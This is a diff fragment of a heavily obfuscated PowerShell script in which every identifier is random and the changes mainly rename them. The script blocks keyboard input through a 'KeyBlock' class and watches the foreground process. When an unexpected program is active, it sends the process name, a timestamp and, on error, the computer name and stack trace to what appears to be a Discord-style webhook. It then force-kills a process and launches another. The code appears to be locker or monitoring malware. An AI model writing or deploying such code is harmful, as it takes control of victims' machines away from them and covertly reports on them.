-    $GpBlAcjOIsgi = [KeyBlock]::GetForegroundWindow()
-    $pDGzXlEsQPsM = 0
-    [KeyBlock]::GetWindowThreadProcessId($GpBlAcjOIsgi, [ref]$pDGzXlEsQPsM) | Out-Null
-    $TSDbgFshWyZl = $null
-    try { $TSDbgFshWyZl = Get-Process -Id $pDGzXlEsQPsM -ErrorAction Stop } catch {}
+    $yPVaImcQkhRU = [KeyBlock]::GetForegroundWindow()
+    $jUjXuELJujZj = 0
+    [KeyBlock]::GetWindowThreadProcessId($yPVaImcQkhRU, [ref]$jUjXuELJujZj) | Out-Null
+    $xkXZDWgyFttU = $null
+    try { $xkXZDWgyFttU = Get-Process -Id $jUjXuELJujZj -ErrorAction Stop } catch {}
 
-    if ($TSDbgFshWyZl -and $TSDbgFshWyZl.ProcessName -ne $dIXfWxHHZNFO) {
-        $EBzCoTBWlsfA = @(
-            @{ name = $gttXndOSRiqJ; value = $puDGuXAteEWI; inline = $true }
-            @{ name = $BLZSEHsQxDLA; value = $zfiYqKTaEXAi; inline = $true }
-            @{ name = $LXyjidnPWgDn; value = $TSDbgFshWyZl.ProcessName; inline = $false }
-            @{ name = $gXNiaSFPLaUm; value = (Get-Date -Format "HH:mm:ss | dd/MM/yyyy"); inline = $false }
+    if ($xkXZDWgyFttU -and $xkXZDWgyFttU.ProcessName -ne $UviZWCQvDaRe) {
+        $sejugvftFbFa = @(
+            @{ name = $bSRJrHFSUQnG; value = $HznaGyHawCLN; inline = $true }
+            @{ name = $oanqaErbDQlA; value = $ENdYBIkQBpqN; inline = $true }
+            @{ name = $HuQjNVGmyprL; value = $xkXZDWgyFttU.ProcessName; inline = $false }
+            @{ name = $EinvamEiLouP; value = (Get-Date -Format "HH:mm:ss | dd/MM/yyyy"); inline = $false }
         )
-        biyxvWqtVtoO $CKarEVYHkQpM $tqBcUibWVYVD 15158332 $EBzCoTBWlsfA
+        aLHanjHMqKQk $UQWMgXxemlyG $TnaYxRcrTKTT 15158332 $sejugvftFbFa
 
-        ZroPvlNiogxD $HbxpDdxfWHOG $MFGLNOXoheGX 5
+        HvKUGnFaPhnK $FFQddZmoISHI $UrWVwlSYDYEY 5
 
         [KeyBlock]::UnblockKeys()
-        taskkill /F /IM $igNjnKUgrLae /T 2>&1 | Out-Null
-        Start-Process $bMZoAxaoOZjA
+        taskkill /F /IM $RxzNGTYLErWV /T 2>&1 | Out-Null
+        Start-Process $fCXuNEzuRGPa
         
-        $global:dLlVGlbTwybM = $false
+        $global:RuazsEAOTKIR = $false
         break
     }
 
-    Start-Sleep -Milliseconds 500
 }
 
 [KeyBlock]::UnblockKeys()
-Stop-Job -Job $jeJCpwyOVcHI -ErrorAction SilentlyContinue
-Remove-Job -Job $jeJCpwyOVcHI -Force -ErrorAction SilentlyContinue
+Stop-Job -Job $NfSmBUdjkjQS -ErrorAction SilentlyContinue
+Remove-Job -Job $NfSmBUdjkjQS -Force -ErrorAction SilentlyContinue
 Get-Job | Where-Object { $_.State -ne "Running" } | Remove-Job -Force -ErrorAction SilentlyContinue
+
+} catch {
+    $IlVImYiXVzXa = @(
+        @{ name = $bSRJrHFSUQnG; value = $env:COMPUTERNAME; inline = $true }
+        @{ name = $yGlAdCMmNSCq; value = $_.Exception.Message; inline = $false }
+        @{ name = $kdMyChVFwzkz; value = $_.ScriptStackTrace; inline = $false }
+    )
+    aLHanjHMqKQk $UQWMgXxemlyG $yOCgaZTHJoPB 16711680 $IlVImYiXVzXa
+    exit 1
+}
